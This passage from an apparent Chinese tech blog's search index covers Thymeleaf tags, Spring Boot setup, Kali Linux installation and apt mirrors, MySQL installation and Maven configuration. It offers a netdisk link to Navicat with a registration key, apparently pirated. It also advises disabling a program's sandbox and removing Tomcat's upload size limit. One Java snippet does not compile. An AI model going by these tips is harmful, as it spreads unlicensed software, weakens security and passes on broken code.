&gt; th:unless 和th:if判断相反 &lt;a th:href=&quot;@{/login}&quot; th:unless=${session.user != null}&gt;Login&lt;/a&gt; th:href 链接地址 &lt;a th:href=&quot;@{/login}&quot; th:unless=${session.user != null}&gt;Login&lt;/a&gt; /&gt; th:switch 多路选择 配合th:case 使用 &lt;div th:switch=&quot;${user.role}&quot;&gt; th:case th:switch的一个分支 &lt;p th:case=&quot;&#39;admin&#39;&quot;&gt;User is an administrator&lt;/p&gt; th:fragment 布局标签，定义一个代码片段，方便其它地方引用 &lt;div th:fragment=&quot;alert&quot;&gt; th:include 布局标签，替换内容到引入的文件 &lt;head th:include=&quot;layout :: htmlhead&quot; th:with=&quot;title=&#39;xx&#39;&quot;&gt;&lt;/head&gt; /&gt; th:replace 布局标签，替换整个标签到引入的文件 &lt;div th:replace=&quot;fragments/header :: title&quot;&gt;&lt;/div&gt; th:selected selected选择框 选中 th:selected=&quot;(${xxx.id} == ${configObj.dd})&quot; th:src 图片类地址引入 &lt;img class=&quot;img-responsive&quot; alt=&quot;App Logo&quot; th:src=&quot;@{/img/logo.png}&quot; /&gt; th:inline 定义js脚本可以使用变量 &lt;script type=&quot;text/javascript&quot; th:inline=&quot;javascript&quot;&gt; th:action 表单提交的地址 &lt;form action=&quot;subscribe.html&quot; th:action=&quot;@{/subscribe}&quot;&gt; th:remove 删除某个属性 &lt;tr th:remove=&quot;all&quot;&gt; 1.all:删除包含标签和所有的孩子。2.body:不包含标记删除,但删除其所有的孩子。3.tag:包含标记的删除,但不删除它的孩子。4.all-but-first:删除所有包含标签的孩子,除了第一个。5.none:什么也不做。这个值是有用的动态评估。 th:attr 设置标签属性，多个属性可以用逗号分隔 比如&lt;p th:attr=&quot;src=@{/image/aa.jpg},title=${title}&quot;&gt;内容&lt;/p&gt;，这样如果${title}=’这个是title’ 则结果就是&lt;p src=&quot;/image/aa.jpg&quot; title=&quot;这个是title&quot;&gt;内容&lt;/p&gt; 参考文献：http://www.thymeleaf.org/doc/tutorials/3.0/usingthymeleaf.html]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Spring Boot</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Ecipse 安装Spring Boot插件]]></title>
    <url>%2Fblog%2F2017%2F07%2F28%2FEcipse%20%E5%AE%89%E8%A3%85Spring%20Boot%E6%8F%92%E4%BB%B6%2F</url>
    <content type="text"><![CDATA[Ecipse 安装Spring Boot插件，这个要安装STS插件1、步骤：打开eclipse–&gt;help–&gt;Eclipse Marketplace–&gt;Spring Tools (aka Spring IDE and Spring Tool Suite)如果在Eclipse Markeplace 没有找到STS ,可以在eclipse 的浏览器中打开链接：https://marketplace.eclipse.org/search/site/sts 进行搜索安装。在Eclipse Markeplace 最下面 点击 Browse for more solutions 进行搜索。 安装过程简单 略……….创建Spring Boot 项目File –&gt; New —&gt;other–&gt;Spring Boot]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Spring Boot</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Spring Boot (二)：Web 开发篇]]></title>
    <url>%2Fblog%2F2017%2F07%2F27%2FSpring%20Boot%20(%E4%BA%8C)%EF%BC%9AWeb%20%E5%BC%80%E5%8F%91%E7%AF%87%2F</url>
    <content type="text"><![CDATA[Springboot之Web 开发篇1、静态资源访问在我们开发Web应用的时候，需要引用大量的js、css、图片等静态资源。 2、默认配置Spring Boot默认提供静态资源目录位置需置于classpath下，目录名需符合如下规则： 1234/static/public/resources/META-INF/resources springboot 的源码如下：123private static final String[] CLASSPATH_RESOURCE_LOCATIONS = &#123; "classpath:/META-INF/resources/", "classpath:/resources/", "classpath:/static/", "classpath:/public/" &#125;; 举例：我们可以在src/main/resources/目录下创建static文件夹，在该位置放置一个图片文件（demo.jpg）。启动程序后，尝试访问http://localhost:8080/demo.jpg如果能显示图片说明配置成功。3、渲染Web页面在之前的示例中，我们都是通过@RestController来处理请求，所以返回的内容为json对象。那么如果需要渲染html页面的时候，要如何实现呢？ 和spring mvc 一样，我们用@Controller 和 @RequestMapping 4、模板引擎在动态HTML实现上Spring Boot依然可以完美胜任，并且提供了多种模板引擎的默认配置支持，所以在推荐的模板引擎下，我们可以很快的上手开发动态网站。Spring Boot提供了默认配置的模板引擎主要有以下几种： Thymeleaf FreeMarker Velocity Groovy Mustache Spring Boot建议使用这些模板引擎，避免使用JSP，当你使用上述模板引擎中的任何一个，它们默认的模板配置路径为：src/main/resources/templates。当然也可以修改这个路径，在application.properties中配置 1234567891011121314151617181920212223242526#### 更多的配置参数如下：```xml# Enable template caching.spring.thymeleaf.cache=true # Check that the templates location exists.spring.thymeleaf.check-template-location=true # Content-Type value.spring.thymeleaf.content-type=text/html # Enable MVC Thymeleaf view resolution.spring.thymeleaf.enabled=true # Template encoding.spring.thymeleaf.encoding=UTF-8 # Comma-separated list of view names that should be excluded from resolution.spring.thymeleaf.excluded-view-names= # Template mode to be applied to templates. See also StandardTemplateModeHandlers.spring.thymeleaf.mode=HTML5 # Prefix that gets prepended to view names when building a URL.spring.thymeleaf.prefix=classpath:/templates/ # Suffix that gets appended to view names when building a URL.spring.thymeleaf.suffix=.html # Order of the template resolver in the chain. spring.thymeleaf.template-resolver-order= # Comma-separated list of view names that can be resolved.spring.thymeleaf.view-names=Demo 示例html页面1234567891011&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;meta charset="UTF-8"/&gt;&lt;title&gt;index&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1 th:text="$&#123;title&#125;"&gt;Hello World&lt;/h1&gt;&lt;h1&gt;&lt;a href="http://www.thymeleaf.org" th:href="@&#123;http://www.lrshuai.top&#125;" th:text="$&#123;atext&#125;"&gt;Thymeleaf&lt;/a&gt;&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt; java 代码12345678910@Controllerpublic class HelloController &#123; @RequestMapping(value=&#123;"/index","/","/hello"&#125;) public String index(Model model)&#123; model.addAttribute("title", "测试"); model.addAttribute("atext", "这个冬天不太Cool"); return "index"; &#125;&#125; Github 代码示例：https://github.com/rstyro/spring-boot/tree/master/springboot-web]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Spring Boot</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Springboot 报错Whitelabel Error Page This application]]></title>
    <url>%2Fblog%2F2017%2F07%2F26%2FSpringboot%20%E6%8A%A5%E9%94%99Whitelabel%20Error%20Page%20This%20application%2F</url>
    <content type="text"><![CDATA[Spring boot 请求报错如下：springboot 入门级错误 Whitelabel Error PageThis application has no explicit mapping for /error, so you are seeing this as a fallback.Tue Jul 25 16:07:38 CST 2017There was an unexpected error (type=Not Found, status=404).No message available 报错原因：Application启动类放的位置不对解决方案:要将Application放在最外层，也就是要包含所有子包。比如你的groupId是top.lrshuai.demo,子包就是所谓的top.lrshuai.demo.xxx,所以要将 Application类要放在top.lrshuai.demo包下。springboot会自动加载启动类所在包下及其子包下的所有组件.]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Spring Boot</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Spring Boot （一）：初识之入门篇]]></title>
    <url>%2Fblog%2F2017%2F07%2F25%2FSpring%20Boot%20%EF%BC%88%E4%B8%80%EF%BC%89%EF%BC%9A%E5%88%9D%E8%AF%86%E4%B9%8B%E5%85%A5%E9%97%A8%E7%AF%87%2F</url>
    <content type="text"><![CDATA[Spring Boot入门一、简介与特点12是由Pivotal团队提供的全新框架，其设计目的是用来简化新Spring应用的初始搭建以及开发过程。该框架使用了特定的方式来进行配置，从而使开发人员不再需要定义样板化的配置。通过这种方式，Spring Boot致力于在蓬勃发展的快速应用开发领域（rapid application development）成为领导者。Java开发者喜好的框架当属Spring，Spring也成为了在Java EE开发中真正意义上的标准，但是随着新技术的发展，脚本语言大行其道的时代（Node JS，Ruby，Groovy，Scala等），Java EE使用Spring逐渐变得笨重起来，大量的XML文件存在与项目中，繁琐的配置，整合第三方框架的配置问题，低下的开发效率和部署效率等等问题，所以Spring Boot 诞生了。 Spring Boot 的特点： 遵循“习惯优于配置”的原则，使用Spring Boot只需要很少的配置，大部分的时候我们直接使用默认的配置即可； 项目快速搭建，可以无需配置的自动整合第三方的框架； 可以完全不使用XML配置文件，只需要自动配置和Java Config； 内嵌Servlet容器，降低了对环境的要求，可以使用命令直接执行项目，应用可用jar包执行：java -jar； 提供了starter POM, 能够非常方便的进行包管理, 很大程度上减少了jar hell或者dependency hell； 运行中应用状态的监控； 对主流开发框架的无配置集成； 与云计算的天然继承；Spring Boot 的核心功能： 独立运行的Spring项目 内嵌的Servlet容器 提供starter简化Manen配置 自动配置Spring 应用监控 无代码生成和XML配置 二、快速创建项目（1）、浏览器打开 http://start.spring.io/（2）、选择maven Project 、和Spring Boot 的版本。（现在出到2.0.0了）（3）、填写项目的基本信息，快捷键ALT + 回车，下载压缩版。或者点击 Gennerate Project 中间绿色按钮（4）、解压，eclipse 导入maven 项目 Eclipse 导入流程：File – &gt;Import -&gt; Existing Maven Projects -&gt; Next -&gt;选择解压后的文件夹(Browse)-&gt; Finsh，OK done! 后面有一篇，eclipse 装springboot 插件的文章]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Spring Boot</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[取消Tomcat 上传文件限制]]></title>
    <url>%2Fblog%2F2017%2F07%2F24%2F%E5%8F%96%E6%B6%88Tomcat%20%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6%E9%99%90%E5%88%B6%2F</url>
    <content type="text"><![CDATA[取消Tomcat 上传文件限制 tomcat 默认上传文件是有大小限制的，好像是2M 的大小而已。上次上传图片的时候就老是失败，查了好久，原来是tomcat自身的问题，现在记录一下 解决方案：进去conf/server.xml 在设置端口的那个地方添加 maxPostSize=“-1” 就可以了如下图，我用的是eclipse]]></content>
      <categories>
        <category>开发工具</category>
      </categories>
      <tags>
        <tag>干货</tag>
        <tag>开发工具</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[正则去掉html 标签和样式，只留文本]]></title>
    <url>%2Fblog%2F2017%2F07%2F23%2F%E6%AD%A3%E5%88%99%E5%8E%BB%E6%8E%89html%20%E6%A0%87%E7%AD%BE%E5%92%8C%E6%A0%B7%E5%BC%8F%EF%BC%8C%E5%8F%AA%E7%95%99%E6%96%87%E6%9C%AC%2F</url>
    <content type="text"><![CDATA[在工作中遇到，记录一下demo12345678910111213141516171819202122232425262728&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;title&gt;正则，去掉所有html标签，只留文本&lt;/title&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;&quot;&gt;&lt;/head&gt;&lt;body&gt; &lt;textarea name=&quot;content&quot; cols=&quot;200&quot; rows=&quot;10&quot; id=&quot;htmlcontent&quot;&gt;这里写html文本&lt;/textarea&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt; &lt;input type=&quot;button&quot; name=&quot;change&quot; value=&quot;生成&quot; id=&quot;change&quot;&gt;&lt;br&gt; &lt;textarea name=&quot;text&quot; cols=&quot;200&quot; rows=&quot;10&quot; id=&quot;result&quot;&gt;&lt;/textarea&gt;&lt;br&gt;&lt;br&gt; &lt;script type=&quot;text/javascript&quot;&gt; document.getElementById(&apos;change&apos;).onclick=function()&#123; var htmlcontent = document.getElementById(&quot;htmlcontent&quot;).value; var result=delHTMLTag(htmlcontent); document.getElementById(&quot;result&quot;).value =result ; &#125; //把html代码 变成文本，正则的意思是以 &lt; 开头和 &gt; 结尾的内容全部替换为空 function delHTMLTag(htmlStr)&#123; htmlStr = htmlStr.replace(/&lt;[^&gt;]+&gt;/g,&quot;&quot;); return htmlStr; &#125; &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 核心是 delHTMLTag 方法]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
        <tag>HTML</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[IO 流 之重复利用]]></title>
    <url>%2Fblog%2F2017%2F07%2F22%2FIO%20%E6%B5%81%20%E4%B9%8B%E9%87%8D%E5%A4%8D%E5%88%A9%E7%94%A8%2F</url>
    <content type="text"><![CDATA[InputStream 之重复利用 有时我们需要重复利用输入流，比如图片上传时获取 图片的宽高…… 还有很多……… 1、代码示例12345678910// 拿到上传文件的输入流InputStream in = files[i].getInputStream();ByteArrayOutputStream baos = new ByteArrayOutputStream(); byte[] buffer = new byte[1024]; int len; while ((len = in.read(buffer)) &gt; -1 ) &#123; baos.write(buffer, 0, len); &#125; baos.flush(); InputStream input = new ByteArrayInputStream(baos.toByteArray()); 2、重复利用如果需要 Inputstream,通过 new ByteArrayInputStream(baos.toByteArray()) 就可以重复取了，想取多少就取多少。3、通过Inputstream 获取图片的宽高 一般做图片上传之类的用得挺多的 12345678int height = &quot;0&quot;;int width = &quot;0&quot;;BufferedImage bi = ImageIO.read(new ByteArrayInputStream(baos.toByteArray()));if (bi != null) &#123; height = bi.getHeight(); width = bi.getWidth(); System.out.println(&quot;height=&quot; + height + &quot;,width=&quot; + width);&#125;]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>计算机基础</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[kali 安装网易云音乐播放器后打不开]]></title>
    <url>%2Fblog%2F2017%2F07%2F21%2Fkali%20%E5%AE%89%E8%A3%85%E7%BD%91%E6%98%93%E4%BA%91%E9%9F%B3%E4%B9%90%E6%92%AD%E6%94%BE%E5%99%A8%E5%90%8E%E6%89%93%E4%B8%8D%E5%BC%80%2F</url>
    <content type="text"><![CDATA[kali 安装网易云音乐播放器后打不开解决方案如下： 1、进入/usr/bin/,修改netease-cloud-music 这个文件, 2、在else 的最后面添加： –no-sandbox 不经过沙箱处理，沙箱是啥么玩意呢？沙箱，在计算机领域中是一种程序隔离的机制，其目的则是限制不可信进程的权限。沙箱技术则常用于执行未经测试的或不可信的客户程序，（比如沙箱杀毒一类的），为了避免不可信程序可能破坏其他的程序运行，沙箱技术可以为不可信的程序提供虚拟化的磁盘，内存以及网络资源，而这又是对客户是透明的。]]></content>
      <categories>
        <category>网络运维</category>
      </categories>
      <tags>
        <tag>干货</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[kali 安装中文拼音]]></title>
    <url>%2Fblog%2F2017%2F07%2F20%2Fkali%20%20%E5%AE%89%E8%A3%85%E4%B8%AD%E6%96%87%E6%8B%BC%E9%9F%B3%2F</url>
    <content type="text"><![CDATA[kali 安装中文拼音 听别人说，kali 很牛掰牛掰，新手不知道牛在哪。装个拼音都不会，尴尬啊。 1、安装过程如下： 1、敲命令：apt-get install ibus ibus-pinyin 2、在设置的–&gt;区域语言–&gt;添加汉字拼音 3、重启kali 系统，可以用拼音了。 如果出现上图所示是因为，apt 源的问题，可以参考 kali 修改apt源，改源之后，打命令，选择Y 2、最后重启，命令 ：reboot 搞定，可以输入中文了]]></content>
      <categories>
        <category>网络运维</category>
      </categories>
      <tags>
        <tag>干货</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Windows 10 与 kali 双系统安装]]></title>
    <url>%2Fblog%2F2017%2F07%2F18%2FWindows%2010%20%E4%B8%8E%20kali%20%E5%8F%8C%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85%2F</url>
    <content type="text"><![CDATA[这个教程是在win10 的环境下进行的，其他环境类似，此教程做参考用。一、教程中用到的工具如下： 1、kali 2017.1镜像, 装送门：http://cdimage.kali.org/kali-2017.1/kali-linux-2017.1-amd64.iso 2、U盘 现在最低也有8G吧 3、软碟通 ，U盘刻录工具 4、EasyBCD 引导工具 5、win 10系统要留出一个空的硬盘，哪个盘的空间比较大可以压缩出大概50G的空间。压缩可以参考 磁盘压缩新建分区 二、kali 制作 U盘启动: 1、电脑插入U盘 2、打开软碟通 3、U盘写入硬盘镜像 过程图如下： 三、开始安装kali前期工作都只是为了这步，好激动。 1、电脑确认插入U盘，重启进入BOIS界面（博主是华硕电脑，按F2,不一样的自行找度娘）。 2、进入bois 选择 boot 3、 在 Boot Option #1 选择你的U盘 4、保存设置并退出，（博主的是f10,保存退出，具体可看右下角的选项（现在的主板都比较高级了，具体看各位的发挥了）） 四、kali 配置我选择 Start installer,博主英语渣，其他的选项也不怎么清楚就不介绍了，但感觉也差不多 下面不做特殊说明的说明，选择默认 之后选择语言，博主选的是英文，所以之后的都是英文，你们可以选第一个简体中文，continue(继续) 之后选择YES, ,无法挂载光盘,选择yes 之后还是不行 的解决办法是：拔下U盘再插上，continue(继续) 之后是问你安装UEFI ,博主不安装选择NO，continue(继续) 之后是硬盘分区，选择手动，continue(继续) 之后选择我们准备好要安装kali的那个分区，我这里是编号为5的分区，请记住你的分区的编号，在后面对于kali的引导装在哪需要。在我们选中的分区上 ，双击或，continue(继续)。 之后写入引导（很重要一步）因为我们的要求是，要使用windows的引导来启动，所以这里我们选择否，如果你想用linux的引导就选是，后面就不用再设置了。，continue(继续) 之后选择分区编号 我输入：/dev/sda5 后面这个数字5就上前面提到过的你选定分区的编号，我的是5，你们的按自己的填写，continue(继续) 之后安装结束，拔出U盘，重启，continue(继续) 五、双系统引导安装完成，重启后发现进入还是windows，没毛病 1、打开引导工具EasyBCD 2、选择添加新条目 3、选择Linux，驱动器那里选择我们刚才安装 linux 的盘，然后点击 添加条目 4、高级设置，选择刚才创建的条目，选择BOOT然后点击 保存设置 5、可以重启，选择你的kali 了 看图：]]></content>
      <categories>
        <category>网络运维</category>
      </categories>
      <tags>
        <tag>干货</tag>
        <tag>Linux</tag>
        <tag>系统装机</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[kali 无法定位软件包的解决办法]]></title>
    <url>%2Fblog%2F2017%2F07%2F17%2Fkali%20%E6%97%A0%E6%B3%95%E5%AE%9A%E4%BD%8D%E8%BD%AF%E4%BB%B6%E5%8C%85%E7%9A%84%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95%2F</url>
    <content type="text"><![CDATA[kali 无法定位软件包的解决办法挺说kali 有多牛逼多牛逼，然后就装了。想装个拼音就报个 无法定位软件包错误，， 解决方案如下：更新apt 的源1、修改apt源的文件，路径为 /etc/apt/sources.list1vim /etc/apt/sources.list 2、apt-get update 更新一下1apt-get update 图如下： Kali 2.0 更新源123456789101112131415161718192021222324252627#中科大deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contribdeb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib #阿里云#deb http://mirrors.aliyun.com/kali kali-rolling main non-free contrib#deb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib #清华大学#deb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free#deb-src https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free #浙大#deb http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free#deb-src http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free #东软大学#deb http://mirrors.neusoft.edu.cn/kali kali-rolling/main non-free contrib#deb-src http://mirrors.neusoft.edu.cn/kali kali-rolling/main non-free contrib #官方源#deb http://http.kali.org/kali kali-rolling main non-free contrib#deb-src http://http.kali.org/kali kali-rolling main non-free contrib #重庆大学#deb http://http.kali.org/kali kali-rolling main non-free contrib#deb-src http://http.kali.org/kali kali-rolling main non-free contrib Kali 1.0–更新源1234567891011121314151617181920212223242526272829303132333435363738#官方源deb http://http.kali.org/kali kali main non-free contribdeb-src http://http.kali.org/kali kali main non-free contribdeb http://security.kali.org/kali-security kali/updates main contrib non-free #中科大kali源deb http://mirrors.ustc.edu.cn/kali kali main non-free contribdeb-src http://mirrors.ustc.edu.cn/kali kali main non-free contribdeb http://mirrors.ustc.edu.cn/kali-security kali/updates main contrib non-free #新加坡kali源deb http://mirror.nus.edu.sg/kali/kali/ kali main non-free contribdeb-src http://mirror.nus.edu.sg/kali/kali/ kali main non-free contribdeb http://security.kali.org/kali-security kali/updates main contrib non-freedeb http://mirror.nus.edu.sg/kali/kali-security kali/updates main contrib non-freedeb-src http://mirror.nus.edu.sg/kali/kali-security kali/updates main contrib non-free #阿里云kali源deb http://mirrors.aliyun.com/kali kali main non-free contribdeb-src http://mirrors.aliyun.com/kali kali main non-free contribdeb http://mirrors.aliyun.com/kali-security kali/updates main contrib non-free #163 Kali源deb http://mirrors.163.com/debian wheezy main non-free contrib deb-src http://mirrors.163.com/debian wheezy main non-free contrib deb http://mirrors.163.com/debian wheezy-proposed-updates main non-free contrib deb-src http://mirrors.163.com/debian wheezy-proposed-updates main non-free contrib deb-src http://mirrors.163.com/debian-security wheezy/updates main non-free contrib deb http://mirrors.163.com/debian-security wheezy/updates main non-free contrib #上海交大 Kali源 (比较慢，直接忽略)#deb http://ftp.sjtu.edu.cn/debian wheezy main non-free contrib#deb-src http://ftp.sjtu.edu.cn/debian wheezy main non-free contrib #deb http://ftp.sjtu.edu.cn/debian wheezy-proposed-updates main non-free contrib #deb-src http://ftp.sjtu.edu.cn/debian wheezy-proposed-updates main non-free contrib #deb http://ftp.sjtu.edu.cn/debian-security wheezy/updates main non-free contrib #deb-src http://ftp.sjtu.edu.cn/debian-security wheezy/updates main non-free contrib 原文出自：http://www.cnblogs.com/dunitian/p/6264806.html]]></content>
      <categories>
        <category>网络运维</category>
      </categories>
      <tags>
        <tag>干货</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Windows 安装MYSQL 5.7服务]]></title>
    <url>%2Fblog%2F2017%2F07%2F16%2FWindows%20%E5%AE%89%E8%A3%85MYSQL%205.7%E6%9C%8D%E5%8A%A1%2F</url>
    <content type="text"><![CDATA[安装MYSQL 5.7服务一、从官网下载.msi 文件官网：https://dev.mysql.com/downloads/windows/installer/5.7.html 二、安装1.同意，接受 2.选择自定义 3.选择软件位数 4、执行 5、选择 下一步 6、选择端口 下面这个是mysql的启动端口（默认3306），不改就点下一步 7、输入mysql root 用户的密码，然后下一步 8、后面没什么了，一路默认下一步就可以了。9、验证是否安装成功 方法一： win+R 打开，输入services.msc 方法二： 在任务栏，右键任务管理器，服务–&gt; 打开服务看看有没有mysql 服务,如果找到如下图，说明安装成功 福利Navicat For Mysql 工具附上百度网盘下载地址：http://pan.baidu.com/s/1kUJITVp 密码：fl41解压，打开key.txt 里面的注册码 进行注册就可以了]]></content>
      <categories>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>开发工具</tag>
        <tag>MYSQL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[进制转换]]></title>
    <url>%2Fblog%2F2017%2F07%2F15%2F%E8%BF%9B%E5%88%B6%E8%BD%AC%E6%8D%A2%2F</url>
    <content type="text"><![CDATA[进制转换 是人们利用符号来计数的方法。进制转换由一组数码符号和两个基本因素“基数”与“位权”构成。基数是指，进位计数制中所采用的数码（数制中用来表示“量”的符号）的个数。位权是指，进位制中每一固定位置对应的单位值。 十进制转二进制简单的说就是十进制数反复除以2，取其余数。直至结果的小数部分为0，直接看图比较容易理解 二进制转十进制二进制数第0位的权值是2的0次方，第1位的权值是2的1次方……简单点说：就是从二进制的右边起，第一位数乘以 2的0次幂+第二位数乘以2的1次幂+….+第n位乘以2的（n-1）次幂 ###二进制转八进制 简单点说：从二进制右边开始起，每3位数，按权展开相加得到一个八进制数，如果位数不够3位就补0。 八进制转二进制八进制转二进制和十进制转二进制有点类似，都是反复除以2 ，如下图 二进制转十六进制每4位二进制数就是一个十六进制数，不足补0 十六进制转二进制和其他的进制转二进制类似，都是除以2 十进制和八进制和十六进制互转十进制转为 八进制或者十六进制， 方法一：是先转为二进制再转为其他的。 方法二：是直接除以 8 或16 取余就可以。 八进制或十六进制转十进制 八进制转十六进制 下面是16 转10 十六和八 互转就是先转为十进制 或者二进制。。。。本人新手，不对之处，请指正。。。]]></content>
      <categories>
        <category>其他</category>
      </categories>
      <tags>
        <tag>计算机基础</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Spring 之 跨越问题解决]]></title>
    <url>%2Fblog%2F2017%2F07%2F14%2FSpring%20%E4%B9%8B%20%E8%B7%A8%E8%B6%8A%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3%2F</url>
    <content type="text"><![CDATA[spring 之 跨域问题解决方案springboot 的跨域问题和它是一样的 之前因为ajax跨越的问题，弄得头大，有用过jsonp 来解决的。可惜就是jsonp 只能是get请求，不能post请求。你虽然写的是post 请求，但底层还是用get请求。 现在好了，spring 4.2版本 之后开始增加了对CORS的支持在Spring MVC 中增加CORS支持非常简单，可以配置全局的规则，也可以使用@CrossOrigin 注解进行细粒度的配置。解决方案：1、在Controller上使用@CrossOrigin注解，这样所有这个控制层下的接口都是可以跨越了。 2、在方法上使用注解。 具体 @CrossOrigin 参数如下图：]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>Spring Boot</tag>
        <tag>Spring</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[修改eclipse 默认的maven配置]]></title>
    <url>%2Fblog%2F2017%2F07%2F13%2F%E4%BF%AE%E6%94%B9eclipse%20%E9%BB%98%E8%AE%A4%E7%9A%84maven%E9%85%8D%E7%BD%AE%2F</url>
    <content type="text"><![CDATA[一、安装maven搜索maven 安装即可二、修改配置文件我的maven 安装路径为： E:\installPath\maven\apache-maven-3.3.9\找到：E:\installPath\maven\apache-maven-3.3.9\conf 下的settings.xml 复制一个 命名为mysetting.xml(名字任取)编辑 mysetting.xml1、修改仓库地址。 默认是在用户文件夹下的.m2/repository 文件夹。我不希望放在那里，所以修改它在标签 settings 里加入如下代码,如下图所示 E:\lrs_repe（这个地址是你的仓库新地址） 2、修改镜像地址 在mirrors 标签中加入 123456789101112131415161718192021&lt;!-- 阿里云Maven镜像 你有更好更快的镜像地址更好 --&gt; &lt;mirror&gt; &lt;id&gt;nexus-aliyun&lt;/id&gt; &lt;mirrorOf&gt;*&lt;/mirrorOf&gt; &lt;name&gt;Nexus aliyun&lt;/name&gt; &lt;url&gt;http://maven.aliyun.com/nexus/content/groups/public&lt;/url&gt; &lt;/mirror&gt;&lt;!-- 下面还有两个 我忘记是哪里的了，其实调上面那个就够了--&gt;&lt;mirror&gt; &lt;id&gt;nexus-osc&lt;/id&gt; &lt;mirrorOf&gt;central&lt;/mirrorOf&gt; &lt;name&gt;Nexus osc&lt;/name&gt; &lt;url&gt;http://maven.oschina.net/content/groups/public/&lt;/url&gt; &lt;/mirror&gt; &lt;mirror&gt; &lt;id&gt;nexus-osc-thirdparty&lt;/id&gt; &lt;mirrorOf&gt;thirdparty&lt;/mirrorOf&gt; &lt;name&gt;Nexus osc thirdparty&lt;/name &lt;url&gt;http://maven.oschina.net/content/repositories/thirdparty/&lt;/url&gt; &lt;/mirror&gt; 3、替换eclipse 的配置文件 打开eclipse—&gt;window–&gt;preferences–&gt;Maven—&gt;User Settings,选择我们刚才更改的文件（mysettings.xml）。 同时你也可以把eclipse自带的换成我们自己安装的]]></content>
      <categories>
        <category>开发工具</category>
      </categories>
      <tags>
        <tag>开发工具</tag>
        <tag>Maven</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[怎么用磁盘压缩卷新建分区]]></title>
    <url>%2Fblog%2F2017%2F07%2F11%2F%E6%80%8E%E4%B9%88%E7%94%A8%E7%A3%81%E7%9B%98%E5%8E%8B%E7%BC%A9%E5%8D%B7%E6%96%B0%E5%BB%BA%E5%88%86%E5%8C%BA%2F</url>
    <content type="text"><![CDATA[利用磁盘压缩卷新建分区1、点击 我的电脑 右键管理-&gt;磁盘管理 然后点击你要压缩出空间的盘。 点击压缩圈，然后输入要挤出多少空间。我这里是挤出200G=200*1024=204800MB 点击压缩 看到未分配的磁盘，右键新建简单卷 出现向导，接下来就一路 下一步 下一步，默认就可以了。 成功了]]></content>
      <categories>
        <category>网络运维</category>
      </categories>
      <tags>
        <tag>干货</tag>
        <tag>系统装机</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[制作U盘启动工具]]></title>
    <url>%2Fblog%2F2017%2F07%2F09%2F%E5%88%B6%E4%BD%9CU%E7%9B%98%E5%90%AF%E5%8A%A8%E5%B7%A5%E5%85%B7%2F</url>
    <content type="text"><![CDATA[制作U盘启动工具有几种方法：一、老毛桃（有捆绑。不推荐，当年我用的时候还没广告，现在不行了）二、大白菜（有捆绑。不推荐）三、U大师 （有捆绑。不推荐）四、优启通 （推荐） 装机新宠,这是IT天空的一款系统预安装环境（PE）。注意别下错了 官网：https://www.itsk.com/ 点击U启 下面有下载链接 下载后解压，双击运行 EasyU_v3.3.exe 程序， 然后，插入U盘，点击全新制作，等它写入 U盘制作启动盘成功。 测试启动下面是bois 启动的，bois选择U盘启动网上有好多教程，这里就不阐述了。 1.选择U盘启动之后，出现如下界面 2.选择第一个 3.进入系统]]></content>
      <categories>
        <category>网络运维</category>
      </categories>
      <tags>
        <tag>干货</tag>
        <tag>系统装机</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Springmvc 基础配置]]></title>
    <url>%2Fblog%2F2017%2F07%2F08%2FSpringmvc%20%E5%9F%BA%E7%A1%80%E9%85%8D%E7%BD%AE%2F</url>
